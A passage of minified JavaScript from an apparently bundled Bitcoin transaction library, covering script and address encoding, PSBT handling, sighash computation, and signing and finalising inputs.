                        const r = Un(t, n).decode(e);
                        if (r > Number.MAX_SAFE_INTEGER) return;
                        return Number(r);
                      } catch (r) {
                        return;
                      }
                  })(e[t - 1]);
                if ("number" === typeof r) {
                  for (let r = 0; r < t - 1; r++) {
                    const t = e[r];
                    if (1 & r) {
                      if (t !== (1 === r ? "CHECKSIG" : "CHECKSIGADD"))
                        throw new Error(
                          "OutScript.encode/tr_ms: wrong element"
                        );
                    } else {
                      if (!dn(t))
                        throw new Error(
                          "OutScript.encode/tr_ms: wrong key element"
                        );
                      n.push(t);
                    }
                  }
                  return { type: "tr_ms", pubkeys: n, m: r };
                }
              },
              decode: (e) => {
                if ("tr_ms" !== e.type) return;
                const t = [e.pubkeys[0], "CHECKSIG"];
                for (let n = 1; n < e.pubkeys.length; n++)
                  t.push(e.pubkeys[n], "CHECKSIGADD");
                return t.push(e.m, "NUMEQUAL"), t;
              },
            },
            {
              encode: (e) => ({ type: "unknown", script: _n.encode(e) }),
              decode: (e) =>
                "unknown" === e.type ? _n.decode(e.script) : void 0,
            },
          ],
          Hr = nn(tn(_n, jt.match($r)), (e) => {
            if ("pk" === e.type && !vn(e.pubkey, mn.ecdsa))
              throw new Error("OutScript/pk: wrong key");
            if (
              ("pkh" === e.type || "sh" === e.type || "wpkh" === e.type) &&
              (!dn(e.hash) || 20 !== e.hash.length)
            )
              throw new Error(`OutScript/${e.type}: wrong hash`);
            if ("wsh" === e.type && (!dn(e.hash) || 32 !== e.hash.length))
              throw new Error("OutScript/wsh: wrong hash");
            if ("tr" === e.type && (!dn(e.pubkey) || !vn(e.pubkey, mn.schnorr)))
              throw new Error("OutScript/tr: wrong taproot public key");
            if (
              ("ms" === e.type || "tr_ns" === e.type || "tr_ms" === e.type) &&
              !Array.isArray(e.pubkeys)
            )
              throw new Error("OutScript/multisig: wrong pubkeys array");
            if ("ms" === e.type) {
              const t = e.pubkeys.length;
              for (const n of e.pubkeys)
                if (!vn(n, mn.ecdsa))
                  throw new Error("OutScript/multisig: wrong pubkey");
              if (e.m <= 0 || t > 16 || e.m > t)
                throw new Error("OutScript/multisig: invalid params");
            }
            if ("tr_ns" === e.type || "tr_ms" === e.type)
              for (const t of e.pubkeys)
                if (!vn(t, mn.schnorr))
                  throw new Error(`OutScript/${e.type}: wrong pubkey`);
            if ("tr_ms" === e.type) {
              const t = e.pubkeys.length;
              if (e.m <= 0 || t > 999 || e.m > t)
                throw new Error("OutScript/tr_ms: invalid params");
            }
            return e;
          });
        function Dr(e, t) {
          if (t.length < 2 || t.length > 40)
            throw new Error("Witness: invalid length");
          if (e > 16) throw new Error("Witness: invalid version");
          if (0 === e && 20 !== t.length && 32 !== t.length)
            throw new Error("Witness: invalid length for version");
        }
        function Mr(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : Cn;
          Dr(e, t);
          const r = 0 === e ? Ot.gW : Ot.iE;
          return r.encode(n.bech32, [e].concat(r.toWords(t)));
        }
        function Fr(e, t) {
          return wn.encode(yn(Uint8Array.from(t), e));
        }
        function jr() {
          let e =
            arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : Cn;
          return {
            encode(t) {
              const { type: n } = t;
              if ("wpkh" === n) return Mr(0, t.hash, e);
              if ("wsh" === n) return Mr(0, t.hash, e);
              if ("tr" === n) return Mr(1, t.pubkey, e);
              if ("pkh" === n) return Fr(t.hash, [e.pubKeyHash]);
              if ("sh" === n) return Fr(t.hash, [e.scriptHash]);
              throw new Error(`Unknown address type=${n}`);
            },
            decode(t) {
              if (t.length < 14 || t.length > 74)
                throw new Error("Invalid address length");
              if (e.bech32 && t.toLowerCase().startsWith(e.bech32)) {
                let n;
                try {
                  if (((n = Ot.gW.decode(t)), 0 !== n.words[0]))
                    throw new Error(`bech32: wrong version=${n.words[0]}`);
                } catch (r) {
                  if (((n = Ot.iE.decode(t)), 0 === n.words[0]))
                    throw new Error(`bech32m: wrong version=${n.words[0]}`);
                }
                if (n.prefix !== e.bech32)
                  throw new Error(`wrong bech32 prefix=${n.prefix}`);
                const [i, ...o] = n.words,
                  s = Ot.gW.fromWords(o);
                if ((Dr(i, s), 0 === i && 32 === s.length))
                  return { type: "wsh", hash: s };
                if (0 === i && 20 === s.length)
                  return { type: "wpkh", hash: s };
                if (1 === i && 32 === s.length)
                  return { type: "tr", pubkey: s };
                throw new Error("Unkown witness program");
              }
              const n = Ot.Jq.decode(t);
              if (25 !== n.length) throw new Error("Invalid base58 address");
              if (n[0] === e.pubKeyHash) {
                const e = Ot.Jq.decode(t);
                return { type: "pkh", hash: e.slice(1, e.length - 4) };
              }
              if (n[0] === e.scriptHash) {
                const e = Ot.Jq.decode(t);
                return {
                  type: "sh",
                  hash: Ot.Jq.decode(t).slice(1, e.length - 4),
                };
              }
              throw new Error(`Invalid address prefix=${n[0]}`);
            },
          };
        }
        var zr;
        !(function (e) {
          (e[(e.DEFAULT = 0)] = "DEFAULT"),
            (e[(e.ALL = 1)] = "ALL"),
            (e[(e.NONE = 2)] = "NONE"),
            (e[(e.SINGLE = 3)] = "SINGLE"),
            (e[(e.ANYONECANPAY = 128)] = "ANYONECANPAY");
        })(zr || (zr = {}));
        tn(Gt, jt.tsEnum(zr));
        function Kr(e) {
          const t = 31 & e;
          return {
            isAny: !!(e & zr.ANYONECANPAY),
            isNone: t === zr.NONE,
            isSingle: t === zr.SINGLE,
          };
        }
        function Wr(e) {
          if (void 0 === e.txid || void 0 === e.index)
            throw new Error("Transaction/input: txid and index required");
          return {
            txid: e.txid,
            index: e.index,
            sequence: hn(e.sequence, In),
            finalScriptSig: hn(e.finalScriptSig, Bt),
          };
        }
        function Vr(e) {
          for (const t in e) {
            const n = t;
            rr.includes(n) || delete e[n];
          }
        }
        function qr(e) {
          if (void 0 === e.script || void 0 === e.amount)
            throw new Error("Transaction/output: script and amount required");
          return { script: e.script, amount: e.amount };
        }
        const Gr = 192,
          Yr = function (e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : Gr;
            return Ve.utils.taggedHash(
              "TapLeaf",
              new Uint8Array([t]),
              Hn.encode(e)
            );
          };
        function Zr(e, t, n) {
          let r =
            arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : Bt;
          return (
            _t(n, t) &&
              ((e = (function (e) {
                let t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : new Uint8Array();
                const n = Ve.utils,
                  { scalar: r, bytes: i } = n.getExtendedPublicKey(e),
                  o = Sn(i, t);
                return n.numberToBytesBE(n.mod(r + o, fn), 32);
              })(e, r)),
              (t = Ve.getPublicKey(e))),
            { privKey: e, pubKey: t }
          );
        }
        function Jr(e) {
          if (
            ((t = e),
            "[object Object]" !== Object.prototype.toString.call(t) ||
              t.constructor !== Object)
          )
            throw new Error(`Wrong object type for transaction options: ${e}`);
          var t;
          const n = {
            ...e,
            version: hn(e.version, 2),
            lockTime: hn(e.lockTime, 0),
            PSBTVersion: hn(e.PSBTVersion, 0),
          };
          if (![-1, 0, 1, 2].includes(n.version))
            throw new Error(`Unknown version: ${n.version}`);
          if ("number" !== typeof n.lockTime)
            throw new Error("Transaction lock time should be number");
          if (
            (Gt.encode(n.lockTime), 0 !== n.PSBTVersion && 2 !== n.PSBTVersion)
          )
            throw new Error(`Unknown PSBT version ${n.PSBTVersion}`);
          for (const r of [
            "allowUnknowOutput",
            "allowUnknowInput",
            "disableScriptCheck",
            "bip174jsCompat",
            "allowLegacyWitnessUtxo",
            "lowR",
          ]) {
            const e = n[r];
            if (void 0 !== e && "boolean" !== typeof e)
              throw new Error(
                `Transation options wrong type: ${r}=${e} (${typeof e})`
              );
          }
          return Object.freeze(n);
        }
        class Xr {
          constructor() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : {};
            (this.global = {}), (this.inputs = []), (this.outputs = []);
            const t = (this.opts = Jr(e));
            0 !== t.lockTime && (this.global.fallbackLocktime = t.lockTime),
              (this.global.txVersion = t.version);
          }
          static fromRaw(e) {
            let t =
              arguments.length > 1 && void 0 !== arguments[1]
                ? arguments[1]
                : {};
            const n = Kn.decode(e),
              r = new Xr({ ...t, version: n.version, lockTime: n.lockTime });
            for (const i of n.outputs) r.addOutput(i);
            if (((r.outputs = n.outputs), (r.inputs = n.inputs), n.witnesses))
              for (let i = 0; i < n.witnesses.length; i++)
                r.inputs[i].finalScriptWitness = n.witnesses[i];
            return r;
          }
          static fromPSBT(e) {
            let t,
              n =
                arguments.length > 1 && void 0 !== arguments[1]
                  ? arguments[1]
                  : {};
            try {
              t = vr.decode(e);
            } catch (u) {
              try {
                t = Er.decode(e);
              } catch (f) {
                throw u;
              }
            }
            const r = t.global.version || 0;
            if (0 !== r && 2 !== r) throw new Error(`Wrong PSBT version=${r}`);
            const i = t.global.unsignedTx,
              o =
                0 === r
                  ? null === i || void 0 === i
                    ? void 0
                    : i.version
                  : t.global.txVersion,
              s =
                0 === r
                  ? null === i || void 0 === i
                    ? void 0
                    : i.lockTime
                  : t.global.fallbackLocktime,
              a = new Xr({ ...n, version: o, lockTime: s, PSBTVersion: r }),
              l =
                0 === r
                  ? null === i || void 0 === i
                    ? void 0
                    : i.inputs.length
                  : t.global.inputCount;
            a.inputs = t.inputs.slice(0, l).map((e, n) => {
              var r;
              return {
                finalScriptSig: Bt,
                ...(null === (r = t.global.unsignedTx) || void 0 === r
                  ? void 0
                  : r.inputs[n]),
                ...e,
              };
            });
            const c =
              0 === r
                ? null === i || void 0 === i
                  ? void 0
                  : i.outputs.length
                : t.global.outputCount;
            return (
              (a.outputs = t.outputs.slice(0, c).map((e, n) => {
                var r;
                return {
                  ...e,
                  ...(null === (r = t.global.unsignedTx) || void 0 === r
                    ? void 0
                    : r.outputs[n]),
                };
              })),
              (a.global = { ...t.global, txVersion: o }),
              0 !== s && (a.global.fallbackLocktime = s),
              a
            );
          }
          toPSBT() {
            let e =
              arguments.length > 0 && void 0 !== arguments[0]
                ? arguments[0]
                : this.opts.PSBTVersion;
            if (0 !== e && 2 !== e) throw new Error(`Wrong PSBT version=${e}`);
            const t = this.inputs.map((t) => wr(e, nr, t));
            for (const i of t)
              i.partialSig && !i.partialSig.length && delete i.partialSig,
                i.finalScriptSig &&
                  !i.finalScriptSig.length &&
                  delete i.finalScriptSig,
                i.finalScriptWitness &&
                  !i.finalScriptWitness.length &&
                  delete i.finalScriptWitness;
            const n = this.outputs.map((t) => wr(e, or, t)),
              r = { ...this.global };
            return (
              0 === e
                ? ((r.unsignedTx = Kn.decode(this.unsignedTx)),
                  delete r.fallbackLocktime,
                  delete r.txVersion)
                : ((r.version = e),
                  (r.txVersion = this.version),
                  (r.inputCount = this.inputs.length),
                  (r.outputCount = this.outputs.length),
                  r.fallbackLocktime &&
                    0 === r.fallbackLocktime &&
                    delete r.fallbackLocktime),
              this.opts.bip174jsCompat &&
                (t.length || t.push({}), n.length || n.push({})),
              (0 === e ? vr : Er).encode({ global: r, inputs: t, outputs: n })
            );
          }
          get lockTime() {
            let e = 0,
              t = 0,
              n = 0,
              r = 0;
            for (const i of this.inputs)
              i.requiredHeightLocktime &&
                ((e = Math.max(e, i.requiredHeightLocktime)), t++),
                i.requiredTimeLocktime &&
                  ((n = Math.max(n, i.requiredTimeLocktime)), r++);
            return t && t >= r
              ? e
              : 0 !== n
              ? n
              : this.global.fallbackLocktime || 0;
          }
          get version() {
            if (void 0 === this.global.txVersion)
              throw new Error("No global.txVersion");
            return this.global.txVersion;
          }
          inputStatus(e) {
            this.checkInputIdx(e);
            const t = this.inputs[e];
            return (t.finalScriptSig && t.finalScriptSig.length) ||
              (t.finalScriptWitness && t.finalScriptWitness.length)
              ? "finalized"
              : t.tapKeySig ||
                (t.tapScriptSig && t.tapScriptSig.length) ||
                (t.partialSig && t.partialSig.length)
              ? "signed"
              : "unsigned";
          }
          inputSighash(e) {
            this.checkInputIdx(e);
            const t = this.inputType(this.inputs[e]).sighash,
              n = t === zr.DEFAULT ? zr.ALL : 3 & t;
            return { sigInputs: t & zr.ANYONECANPAY, sigOutputs: n };
          }
          signStatus() {
            let e = !0,
              t = !0,
              n = [],
              r = [];
            for (let i = 0; i < this.inputs.length; i++) {
              if ("unsigned" === this.inputStatus(i)) continue;
              const { sigInputs: o, sigOutputs: s } = this.inputSighash(i);
              if ((o === zr.ANYONECANPAY ? n.push(i) : (e = !1), s === zr.ALL))
                t = !1;
              else if (s === zr.SINGLE) r.push(i);
              else if (s !== zr.NONE)
                throw new Error(`Wrong signature hash output type: ${s}`);
            }
            return { addInput: e, addOutput: t, inputs: n, outputs: r };
          }
          get isFinal() {
            for (let e = 0; e < this.inputs.length; e++)
              if ("finalized" !== this.inputStatus(e)) return !1;
            return !0;
          }
          get hasWitnesses() {
            let e = !1;
            for (const t of this.inputs)
              t.finalScriptWitness && t.finalScriptWitness.length && (e = !0);
            return e;
          }
          get weight() {
            if (!this.isFinal) throw new Error("Transaction is not finalized");
            let e = 32;
            const t = this.outputs.map(qr);
            this.hasWitnesses && (e += 2),
              (e += 4 * Ln.encode(this.inputs.length).length),
              (e += 4 * Ln.encode(this.outputs.length).length);
            for (const n of this.inputs)
              n.finalScriptSig &&
                (e += 160 + 4 * Hn.encode(n.finalScriptSig).length);
            for (const n of t) e += 32 + 4 * Hn.encode(n.script).length;
            if (this.hasWitnesses)
              for (const n of this.inputs)
                n.finalScriptWitness &&
                  (e += jn.encode(n.finalScriptWitness).length);
            return e;
          }
          get vsize() {
            return Math.ceil(this.weight / 4);
          }
          toBytes() {
            let e =
                arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
              t =
                arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
            return Kn.encode({
              version: this.version,
              lockTime: this.lockTime,
              inputs: this.inputs
                .map(Wr)
                .map((t) => ({
                  ...t,
                  finalScriptSig: (e && t.finalScriptSig) || Bt,
                })),
              outputs: this.outputs.map(qr),
              witnesses: this.inputs.map((e) => e.finalScriptWitness || []),
              segwitFlag: t && this.hasWitnesses,
            });
          }
          get unsignedTx() {
            return this.toBytes(!1, !1);
          }
          get hex() {
            return Ot.$v.encode(this.toBytes(!0, this.hasWitnesses));
          }
          get hash() {
            if (!this.isFinal) throw new Error("Transaction is not finalized");
            return Ot.$v.encode(gn(this.toBytes(!0)));
          }
          get id() {
            if (!this.isFinal) throw new Error("Transaction is not finalized");
            return Ot.$v.encode(gn(this.toBytes(!0)).reverse());
          }
          checkInputIdx(e) {
            if (!Number.isSafeInteger(e) || 0 > e || e >= this.inputs.length)
              throw new Error(`Wrong input index=${e}`);
          }
          normalizeInput(e, t, n) {
            let { nonWitnessUtxo: r, txid: i } = e;
            "string" === typeof r && (r = Ot.$v.decode(r)),
              dn(r) && (r = Kn.decode(r)),
              void 0 === r &&
                (r = null === t || void 0 === t ? void 0 : t.nonWitnessUtxo),
              "string" === typeof i && (i = Ot.$v.decode(i)),
              void 0 === i &&
                (i = null === t || void 0 === t ? void 0 : t.txid);
            let o,
              s = { ...t, ...e, nonWitnessUtxo: r, txid: i };
            return (
              void 0 === s.nonWitnessUtxo && delete s.nonWitnessUtxo,
              void 0 === s.sequence && (s.sequence = In),
              null === s.tapMerkleRoot && delete s.tapMerkleRoot,
              (s = br(nr, s, t, n)),
              fr.encode(s),
              s.nonWitnessUtxo && void 0 !== s.index
                ? (o = s.nonWitnessUtxo.outputs[s.index])
                : s.witnessUtxo && (o = s.witnessUtxo),
              o &&
                !this.opts.disableScriptCheck &&
                ur(o && o.script, s.redeemScript, s.witnessScript),
              s
            );
          }
          addInput(e) {
            if (
              !(
                arguments.length > 1 &&
                void 0 !== arguments[1] &&
                arguments[1]
              ) &&
              !this.signStatus().addInput
            )
              throw new Error("Tx has signed inputs, cannot add new one");
            return (
              this.inputs.push(this.normalizeInput(e)), this.inputs.length - 1
            );
          }
          updateInput(e, t) {
            let n,
              r =
                arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            if ((this.checkInputIdx(e), !r)) {
              const t = this.signStatus();
              (t.addInput && !t.inputs.includes(e)) || (n = ir);
            }
            this.inputs[e] = this.normalizeInput(t, this.inputs[e], n);
          }
          checkOutputIdx(e) {
            if (!Number.isSafeInteger(e) || 0 > e || e >= this.outputs.length)
              throw new Error(`Wrong output index=${e}`);
          }
          normalizeOutput(e, t, n) {
            let { amount: r, script: i } = e;
            if (
              (void 0 === r &&
                (r = null === t || void 0 === t ? void 0 : t.amount),
              "bigint" !== typeof r)
            )
              throw new Error("amount must be bigint sats");
            "string" === typeof i && (i = Ot.$v.decode(i)),
              void 0 === i &&
                (i = null === t || void 0 === t ? void 0 : t.script);
            let o = { ...t, ...e, amount: r, script: i };
            if (
              (void 0 === o.amount && delete o.amount,
              (o = br(or, o, t, n)),
              hr.encode(o),
              o.script &&
                !this.opts.allowUnknowOutput &&
                "unknown" === Hr.decode(o.script).type)
            )
              throw new Error(
                "Transaction/output: unknown output script type, there is a chance that input is unspendable. Pass allowUnkownScript=true, if you sure"
              );
            return (
              this.opts.disableScriptCheck ||
                ur(o.script, o.redeemScript, o.witnessScript),
              o
            );
          }
          addOutput(e) {
            if (
              !(
                arguments.length > 1 &&
                void 0 !== arguments[1] &&
                arguments[1]
              ) &&
              !this.signStatus().addOutput
            )
              throw new Error("Tx has signed outputs, cannot add new one");
            return (
              this.outputs.push(this.normalizeOutput(e)),
              this.outputs.length - 1
            );
          }
          updateOutput(e, t) {
            let n,
              r =
                arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
            if ((this.checkOutputIdx(e), !r)) {
              const t = this.signStatus();
              (t.addOutput && !t.outputs.includes(e)) || (n = sr);
            }
            this.outputs[e] = this.normalizeOutput(t, this.outputs[e], n);
          }
          addOutputAddress(e, t) {
            let n =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : Cn;
            return this.addOutput({
              script: Hr.encode(jr(n).decode(e)),
              amount: t,
            });
          }
          get fee() {
            let e = 0n;
            for (const n of this.inputs) {
              const t = this.prevOut(n);
              if (!t) throw new Error("Empty input amount");
              e += t.amount;
            }
            const t = this.outputs.map(qr);
            for (const n of t) e -= n.amount;
            return e;
          }
          preimageLegacy(e, t, n) {
            const { isAny: r, isNone: i, isSingle: o } = Kr(n);
            if (e < 0 || !Number.isSafeInteger(e))
              throw new Error(`Invalid input idx=${e}`);
            if ((o && e >= this.outputs.length) || e >= this.inputs.length)
              return Kt.encode(1n);
            t = _n.encode(_n.decode(t).filter((e) => "CODESEPARATOR" !== e));
            let s = this.inputs
              .map(Wr)
              .map((n, r) => ({ ...n, finalScriptSig: r === e ? t : Bt }));
            r
              ? (s = [s[e]])
              : (i || o) &&
                (s = s.map((t, n) => ({
                  ...t,
                  sequence: n === e ? t.sequence : 0,
                })));
            let a = this.outputs.map(qr);
            i ? (a = []) : o && (a = a.slice(0, e).fill(Fn).concat([a[e]]));
            const l = Kn.encode({
              lockTime: this.lockTime,
              version: this.version,
              segwitFlag: !1,
              inputs: s,
              outputs: a,
            });
            return gn(l, Zt.encode(n));
          }
          preimageWitnessV0(e, t, n, r) {
            const { isAny: i, isNone: o, isSingle: s } = Kr(n);
            let a = On,
              l = On,
              c = On;
            const u = this.inputs.map(Wr),
              f = this.outputs.map(qr);
            i || (a = gn(...u.map(Sr.encode))),
              i || s || o || (l = gn(...u.map((e) => Gt.encode(e.sequence)))),
              s || o
                ? s && e < f.length && (c = gn(Mn.encode(f[e])))
                : (c = gn(...f.map(Mn.encode)));
            const h = u[e];
            return gn(
              Zt.encode(this.version),
              a,
              l,
              Qt(32, !0).encode(h.txid),
              Gt.encode(h.index),
              Hn.encode(t),
              Wt.encode(r),
              Gt.encode(h.sequence),
              c,
              Gt.encode(this.lockTime),
              Gt.encode(n)
            );
          }
          preimageWitnessV1(e, t, n, r) {
            let i =
                arguments.length > 4 && void 0 !== arguments[4]
                  ? arguments[4]
                  : -1,
              o = arguments.length > 5 ? arguments[5] : void 0,
              s =
                arguments.length > 6 && void 0 !== arguments[6]
                  ? arguments[6]
                  : 192,
              a = arguments.length > 7 ? arguments[7] : void 0;
            if (!Array.isArray(r) || this.inputs.length !== r.length)
              throw new Error(`Invalid amounts array=${r}`);
            if (!Array.isArray(t) || this.inputs.length !== t.length)
              throw new Error(`Invalid prevOutScript array=${t}`);
            const l = [
                Xt.encode(0),
                Xt.encode(n),
                Zt.encode(this.version),
                Gt.encode(this.lockTime),
              ],
              c = n === zr.DEFAULT ? zr.ALL : 3 & n,
              u = n & zr.ANYONECANPAY,
              f = this.inputs.map(Wr),
              h = this.outputs.map(qr);
            u !== zr.ANYONECANPAY &&
              l.push(
                ...[
                  f.map(Sr.encode),
                  r.map(Wt.encode),
                  t.map(Hn.encode),
                  f.map((e) => Gt.encode(e.sequence)),
                ].map((e) => dt(yn(...e)))
              ),
              c === zr.ALL && l.push(dt(yn(...h.map(Mn.encode))));
            const d = (a ? 1 : 0) | (o ? 2 : 0);
            if ((l.push(new Uint8Array([d])), u === zr.ANYONECANPAY)) {
              const n = f[e];
              l.push(
                Sr.encode(n),
                Wt.encode(r[e]),
                Hn.encode(t[e]),
                Gt.encode(n.sequence)
              );
            } else l.push(Gt.encode(e));
            return (
              1 & d && l.push(dt(Hn.encode(a || Bt))),
              c === zr.SINGLE &&
                l.push(e < h.length ? dt(Mn.encode(h[e])) : On),
              o && l.push(Yr(o, s), Xt.encode(0), Zt.encode(i)),
              Ve.utils.taggedHash("TapSighash", ...l)
            );
          }
          prevOut(e) {
            if (e.nonWitnessUtxo) {
              if (void 0 === e.index) throw new Error("Uknown input index");
              return e.nonWitnessUtxo.outputs[e.index];
            }
            if (e.witnessUtxo) return e.witnessUtxo;
            throw new Error("Cannot find previous output info.");
          }
          inputType(e) {
            let t = "legacy",
              n = zr.ALL;
            const r = this.prevOut(e),
              i = Hr.decode(r.script);
            let o = i.type,
              s = i;
            const a = [i];
            if ("tr" === i.type)
              return (
                (n = zr.DEFAULT),
                {
                  txType: "taproot",
                  type: "tr",
                  last: i,
                  lastScript: r.script,
                  defaultSighash: n,
                  sighash: e.sighashType || n,
                }
              );
            {
              if (
                (("wpkh" !== i.type && "wsh" !== i.type) || (t = "segwit"),
                "sh" === i.type)
              ) {
                if (!e.redeemScript)
                  throw new Error("inputType: sh without redeemScript");
                let n = Hr.decode(e.redeemScript);
                ("wpkh" !== n.type && "wsh" !== n.type) || (t = "segwit"),
                  a.push(n),
                  (s = n),
                  (o += `-${n.type}`);
              }
              if ("wsh" === s.type) {
                if (!e.witnessScript)
                  throw new Error("inputType: wsh without witnessScript");
                let n = Hr.decode(e.witnessScript);
                "wsh" === n.type && (t = "segwit"),
                  a.push(n),
                  (s = n),
                  (o += `-${n.type}`);
              }
              const r = a[a.length - 1];
              if ("sh" === r.type || "wsh" === r.type)
                throw new Error("inputType: sh/wsh cannot be terminal type");
              const l = {
                type: o,
                txType: t,
                last: r,
                lastScript: Hr.encode(r),
                defaultSighash: n,
                sighash: e.sighashType || n,
              };
              if (
                "legacy" === t &&
                !this.opts.allowLegacyWitnessUtxo &&
                !e.nonWitnessUtxo
              )
                throw new Error(
                  "Transaction/sign: legacy input without nonWitnessUtxo, can result in attack that forces paying higher fees. Pass allowLegacyWitnessUtxo=true, if you sure"
                );
              return l;
            }
          }
          signIdx(e, t, n, r) {
            this.checkInputIdx(t);
            const i = this.inputs[t],
              o = this.inputType(i);
            if (!dn(e)) {
              if (!i.bip32Derivation || !i.bip32Derivation.length)
                throw new Error("bip32Derivation: empty");
              const n = i.bip32Derivation
                .filter((t) => t[1].fingerprint == e.fingerprint)
                .map((t) => {
                  let [n, { path: r }] = t,
                    i = e;
                  for (const e of r) i = i.deriveChild(e);
                  if (!_t(i.publicKey, n))
                    throw new Error("bip32Derivation: wrong pubKey");
                  if (!i.privateKey)
                    throw new Error("bip32Derivation: no privateKey");
                  return i;
                });
              if (!n.length)
                throw new Error(
                  `bip32Derivation: no items with fingerprint=${e.fingerprint}`
                );
              let r = !1;
              for (const e of n) this.signIdx(e.privateKey, t) && (r = !0);
              return r;
            }
            n || (n = [o.defaultSighash]);
            const s = o.sighash;
            if (!n.includes(s))
              throw new Error(
                `Input with not allowed sigHash=${s}. Allowed: ${n.join(", ")}`
              );
            const { sigInputs: a, sigOutputs: l } = this.inputSighash(t);
            if (l === zr.SINGLE && t >= this.outputs.length)
              throw new Error(
                `Input with sighash SINGLE, but there is no output with corresponding index=${t}`
              );
            const c = this.prevOut(i);
            if ("taproot" === o.txType) {
              if (i.tapBip32Derivation)
                throw new Error("tapBip32Derivation unsupported");
              const n = this.inputs.map(this.prevOut),
                o = n.map((e) => e.script),
                a = n.map((e) => e.amount);
              let l = !1,
                c = Ve.getPublicKey(e),
                u = i.tapMerkleRoot || Bt;
              if (i.tapInternalKey) {
                const { pubKey: n, privKey: f } = Zr(e, c, i.tapInternalKey, u),
                  [h, d] = xn(i.tapInternalKey, u);
                if (_t(h, n)) {
                  const e = this.preimageWitnessV1(t, o, s, a),
                    n = yn(
                      Ve.sign(e, f, r),
                      s !== zr.DEFAULT ? new Uint8Array([s]) : Bt
                    );
                  this.updateInput(t, { tapKeySig: n }, !0), (l = !0);
                }
              }
              if (i.tapLeafScript) {
                i.tapScriptSig = i.tapScriptSig || [];
                for (const [n, u] of i.tapLeafScript) {
                  const i = u.subarray(0, -1),
                    f = _n.decode(i),
                    h = u[u.length - 1],
                    d = Yr(i, h),
                    { pubKey: p, privKey: g } = Zr(e, c, n.internalKey, Bt);
                  if (-1 === f.findIndex((e) => dn(e) && _t(e, p))) continue;
                  const y = this.preimageWitnessV1(t, o, s, a, void 0, i, h),
                    w = yn(
                      Ve.sign(y, g, r),
                      s !== zr.DEFAULT ? new Uint8Array([s]) : Bt
                    );
                  this.updateInput(
                    t,
                    { tapScriptSig: [[{ pubKey: p, leafHash: d }, w]] },
                    !0
                  ),
                    (l = !0);
                }
              }
              if (!l) throw new Error("No taproot scripts signed");
              return !0;
            }
            {
              const n = un(e);
              let r = !1;
              const i = pn(n);
              for (const e of _n.decode(o.lastScript))
                dn(e) && (_t(e, n) || _t(e, i)) && (r = !0);
              if (!r)
                throw new Error(
                  `Input script doesn't have pubKey: ${o.lastScript}`
                );
              let a;
              if ("legacy" === o.txType)
                a = this.preimageLegacy(t, o.lastScript, s);
              else {
                if ("segwit" !== o.txType)
                  throw new Error(
                    `Transaction/sign: unknown tx type: ${o.txType}`
                  );
                {
                  let e = o.lastScript;
                  "wpkh" === o.last.type &&
                    (e = Hr.encode({ type: "pkh", hash: o.last.hash })),
                    (a = this.preimageWitnessV0(t, e, s, c.amount));
                }
              }
              const l = (function (e, t) {
                let n =
                    arguments.length > 2 &&
                    void 0 !== arguments[2] &&
                    arguments[2],
                  r = cn(e, t);
                if (n && !En(r)) {
                  const n = new Uint8Array(32);
                  for (
                    let i = 0;
                    i < Number.MAX_SAFE_INTEGER &&
                    (n.set(Gt.encode(i)),
                    (r = cn(e, t, { extraEntropy: n })),
                    !En(r));
                    i++
                  );
                }
                return r.toDERRawBytes();
              })(a, e, this.opts.lowR);
              this.updateInput(
                t,
                { partialSig: [[n, yn(l, new Uint8Array([s]))]] },
                !0
              );
            }
            return !0;
          }
          sign(e, t, n) {
            let r = 0;
            for (let o = 0; o < this.inputs.length; o++)
              try {
                this.signIdx(e, o, t, n) && r++;
              } catch (i) {}
            if (!r) throw new Error("No inputs signed");
            return r;
          }
          finalizeIdx(e) {
            if ((this.checkInputIdx(e), this.fee < 0n))
              throw new Error("Outputs spends more than inputs amount");
            const t = this.inputs[e],
              n = this.inputType(t);
            if ("taproot" === n.txType) {
              if (t.tapKeySig) t.finalScriptWitness = [t.tapKeySig];
              else {
                if (!t.tapLeafScript || !t.tapScriptSig)
                  throw new Error("finalize/taproot: unknown input");
                {
                  const e = t.tapLeafScript.sort(
                    (e, t) => qn.encode(e[0]).length - qn.encode(t[0]).length
                  );
                  for (const [n, r] of e) {
                    const e = r.slice(0, -1),
                      i = r[r.length - 1],
                      o = Hr.decode(e),
                      s = Yr(e, i),
                      a = t.tapScriptSig.filter((e) => _t(e[0].leafHash, s));
                    let l = [];
                    if ("tr_ms" === o.type) {
                      const e = o.m,
                        t = o.pubkeys;
                      let n = 0;
                      for (const r of t) {
                        const t = a.findIndex((e) => _t(e[0].pubKey, r));
                        n !== e && -1 !== t
                          ? (l.push(a[t][1]), n++)
                          : l.push(Bt);
                      }
                      if (n !== e) continue;
                    } else if ("tr_ns" === o.type) {
                      for (const e of o.pubkeys) {
                        const t = a.findIndex((t) => _t(t[0].pubKey, e));
                        -1 !== t && l.push(a[t][1]);
                      }
                      if (l.length !== o.pubkeys.length) continue;
                    } else {
                      if ("unknown" !== o.type || !this.opts.allowUnknowInput)
                        throw new Error("Finalize: Unknown tapLeafScript");
                      {
                        const t = _n.decode(e);
                        if (
                          ((l = a
                            .map((e) => {
                              let [{ pubKey: n }, r] = e;
                              const i = t.findIndex((e) => dn(e) && _t(e, n));
                              if (-1 === i)
                                throw new Error(
                                  "finalize/taproot: cannot find position of pubkey in script"
                                );
                              return { signature: r, pos: i };
                            })
                            .sort((e, t) => e.pos - t.pos)
                            .map((e) => e.signature)),
                          !l.length)
                        )
                          continue;
                      }
                    }
                    t.finalScriptWitness = l
                      .reverse()
                      .concat([e, qn.encode(n)]);
                    break;
                  }
                  if (!t.finalScriptWitness)
                    throw new Error("finalize/taproot: empty witness");
                }
              }
              return (t.finalScriptSig = Bt), void Vr(t);
            }
            if (!t.partialSig || !t.partialSig.length)
              throw new Error("Not enough partial sign");
            let r,
              i,
              o = Bt,
              s = [];
            if ("ms" === n.last.type) {
              const e = n.last.m,
                r = n.last.pubkeys;
              let i = [];
              for (const n of r) {
